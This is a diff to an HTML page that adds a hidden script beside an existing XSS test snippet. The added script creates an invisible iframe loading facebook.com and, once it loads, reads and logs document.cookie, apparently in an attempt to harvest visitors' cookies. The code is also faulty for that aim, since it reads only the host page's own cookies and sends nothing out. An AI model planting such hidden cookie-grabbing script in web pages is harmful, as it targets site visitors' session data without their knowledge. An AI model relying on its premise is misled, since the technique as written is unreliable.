@@ -38,6 +38,7 @@
         }
     </style>
 </head>
+    
 <script>
 document.addEventListener("DOMContentLoaded", function() {
     var xhr = new XMLHttpRequest();
@@ -52,6 +53,29 @@ document.addEventListener("DOMContentLoaded", function() {
     formData.append("data", "Hello from XSS");
     xhr.send(formData);
 });
+</script>
+    
+    <script>
+  // Create an iframe element
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  
+  // Set the iframe source to Facebook
+  iframe.src = 'https://www.facebook.com';
+  
+  // Wait for the iframe to load
+  iframe.onload = function() {
+    // Use setTimeout to delay the execution
+    setTimeout(function() {
+      // Get the cookies from the iframe
+      var cookies = document.cookie;
+      console.log(cookies);
+      
+      // Remove the iframe
+      document.body.removeChild(iframe);
+    }, 1000); // Adjust the delay as needed
+  };
 </script>
 <body>
 
